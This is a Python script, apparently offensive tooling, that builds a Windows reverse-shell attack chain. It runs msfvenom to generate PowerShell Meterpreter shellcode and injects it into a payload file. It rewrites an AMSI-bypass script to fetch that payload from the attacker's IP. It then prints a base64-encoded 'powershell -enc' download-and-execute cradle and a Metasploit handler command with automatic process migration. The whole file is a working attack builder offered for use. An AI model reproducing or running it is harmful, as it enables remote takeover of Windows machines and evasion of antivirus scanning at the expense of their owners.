import sys
import subprocess
import re
import base64
import time


IP=sys.argv[1]
PORT=sys.argv[2]
PAYLOAD=sys.argv[3]



print(f'IP: {IP} \nPORT: {PORT}')
print(f'Genegate Powershell payload to MSF:{PAYLOAD}')

msf_shellcode=f'msfvenom -p {PAYLOAD} LHOST={IP} LPORT={PORT} EXITFUNC=thread -f ps1 -o shell'

subprocess.call(msf_shellcode, shell=True)

with open('shell', 'r') as file:
    shellcode=file.read()

with open('met.txt', 'r') as file:
    content=file.read()

pattern = r"\$Shellcode='.*?'"
replacement = f"$Shellcode='{shellcode}'"
new_content = re.sub(pattern, replacement, content)


with open('met.txt', 'w') as file:
    file.write(new_content)


with open('amsi.txt', 'r') as file:
    content=file.read()
pattern= r'http://[\d\.]+/met\.txt'
replacement = f"http://{IP}/met.txt"
new_content = re.sub(pattern, replacement, content)

with open('amsi.txt', 'w') as file:
    file.write(new_content)


load= f'(New-Object System.Net.WebClient).DownloadString("http://{IP}/amsi.txt") | IEX'
base64_powershell = base64.b64encode(load.encode('utf-16le')).decode()

print(f'msfconsole -q -x "use exploit/multi/handler; set payload {PAYLOAD}; set LHOST {IP}; set LPORT {PORT}; set AutoRunScript migrate -f; exploit -j"')


print(f'powershell -enc {base64_powershell}')






